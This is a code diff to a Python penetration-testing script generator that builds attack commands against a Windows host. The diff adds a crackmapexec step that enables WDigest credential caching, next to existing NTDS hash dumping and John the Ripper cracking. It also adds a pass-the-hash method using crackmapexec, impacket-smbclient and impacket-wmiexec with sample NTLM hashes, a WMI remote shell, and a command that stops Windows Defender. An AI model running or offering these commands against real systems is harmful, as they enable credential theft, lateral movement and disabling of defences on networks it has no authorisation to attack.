@@ -155,6 +155,7 @@ class CreateTests:
         output += self.mimikatz() + self.util.seperator_line()
         output += self.rdp() + self.util.seperator_line()
         output += self.crackpassword() + self.util.seperator_line()
+        output += self.passthehash() + self.util.seperator_line()
             
         self.save_results(output, './reports', str(self.host_ip) + ".txt")
 
@@ -198,6 +199,7 @@ class CreateTests:
         Gather Hashes
         """
         cmd = 'crackmapexec smb {0} -u {1} -p "'"{2}"'" --ntds drsuapi -d {3}\n'.format(self.host_ip, self.username, self.password, self.domain)
+        cmd += 'crackmapexec smb {0} -u {1} -p "'"{2}"'" -d {3} -M wdigest -o ACTION=ENABLE\n'.format(self.host_ip, self.username, self.password, self.domain)
         cmd += 'cd ~/.cme/logs #-- output of hash dump goes here\n'
 
         #output = self.util.execute_command(cmd)
@@ -223,7 +225,21 @@ class CreateTests:
         cmd += 'john --wordlist=passwords.txt hashes.txt --format=NT --rules=WordList\n'
         cmd += 'john --show hashes.txt --format=NT > cracked.txt\n'
         
-        return cmd 
+        return cmd
+    
+    def passthehash(self):
+        """
+        Pass the Hash
+        """
+        cmd ='crackmapexec smb {0} -u <USER> -H <HASH>\n'.format(self.host_ip)
+        cmd += '### NOTE THE IMPACKET FORMAT IS LM:NTLM FORMAT HASH ###\n'
+        cmd += 'impacket-smbclient -hashes aad3b635b51404eeaad3b435b52404ee:ab58888a6134dee5657fdc3ff01decdb -target-ip {0} {1}/{2}\n'.format(self.host_ip, self.domain, self.username)
+        cmd += '### WMI SHELL ###\n'
+        cmd += 'impacket-wmiexec -hashes aad1b435b51404eeaad3b435b41404ee:ab58868a6134dee5452fdc1ff01decdb {0}/{1} @{2}\n'.format(self.domain, self.username,self.host_ip)
+        cmd += 'sc stop windefend  ### (sc query to see other AVs ###)\n'
+        
+        return cmd      
+    
     def save_results(self, results, folder_name, file_name):
         """
         Save to a file
@@ -275,7 +291,7 @@ if __name__ == '__main__':
     util = UTILITIES()
 
     # print Banner
-    print("Welcome To Pentest Robot")
+    print("Welcome To Script Generator")
     print(util.seperator_line())
     print("Enter a single IP or Range in CIDR format (e.g. 192.168.0.0/24):")
 
